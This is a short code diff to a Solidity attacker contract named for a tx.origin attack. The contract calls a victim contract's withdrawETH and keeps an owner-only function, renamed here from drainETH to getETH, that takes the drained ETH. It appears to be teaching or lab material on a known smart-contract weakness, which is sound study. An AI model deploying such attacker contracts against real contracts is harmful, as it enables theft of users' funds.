@@ -24,7 +24,7 @@ contract tx.originAttacker {
        victimContract.withdrawETH();
     }
 
-    function drainETH() external {
+    function getETH() external {
         require(msg.sender == owner, "Only attacker EOA can call");
         uint256 bal = address(this).balance;
         require(bal > 0, "No ETH to drain");
